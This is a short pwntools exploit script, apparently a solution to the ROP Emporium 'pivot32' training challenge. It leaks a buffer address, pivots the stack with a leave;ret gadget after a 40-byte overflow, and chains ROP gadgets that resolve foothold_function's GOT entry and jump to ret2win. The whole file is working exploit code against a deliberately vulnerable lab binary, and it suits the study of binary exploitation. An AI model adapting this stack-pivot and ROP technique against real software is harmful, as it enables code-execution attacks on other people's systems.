from pwn import *

p = process("./pivot32")
elf = ELF("./pivot32")
lib_elf = ELF("./libpivot32.so")

func_plt = elf.plt['foothold_function']
func_got_plt = elf.got['foothold_function']
foothold_sym = lib_elf.symbols['foothold_function']
ret2win_sym = lib_elf.symbols['ret2win']

offset = ret2win_sym - foothold_sym

leave_ret = 0x08048815   # leave; ret
pop_eax = 0x0804882c     # pop eax; ret
mov_eax_eax = 0x08048830 # mov eax, [eax]
pop_ebx = 0x080488b6
add_eax_ebx = 0x08048833
call_eax = 0x080485f0

p.recvuntil("pivot: ")
buffer = int(p.recv(10), 16)

rop = p32(func_plt) # first call to update got
rop += p32(pop_eax) # pop eax, func_got_ply
rop += p32(func_got_plt)
rop += p32(mov_eax_eax)
rop += p32(pop_ebx) # pop ebx, offset
rop += p32(offset)
rop += p32(add_eax_ebx)
rop += p32(call_eax)

stack_smash = b'A'*40 + p32(buffer-4) + p32(leave_ret)

p.recvuntil('> ')
p.sendline(rop)
p.recvuntil('> ')
p.sendline(stack_smash)
p.interactive()
